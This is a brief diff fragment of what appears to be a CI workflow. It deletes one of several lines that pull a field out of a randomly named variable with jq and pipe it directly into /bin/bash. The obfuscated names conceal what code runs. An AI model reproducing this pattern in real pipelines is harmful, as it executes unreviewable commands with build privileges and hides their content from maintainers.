@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$y668" | jq -r .lucbl2 | /bin/bash
           printf '%s' "$rzvs9" | jq -r .fya3 | /bin/bash
           printf '%s' "$vlj55239" | jq -r .ewk6832 | /bin/bash
-          echo $s23486 | jq -r .zfl8458 | /bin/bash
           printf '%s' "$a31653" | jq -r .ilde4 | /bin/bash
 
       - name: Upload archive
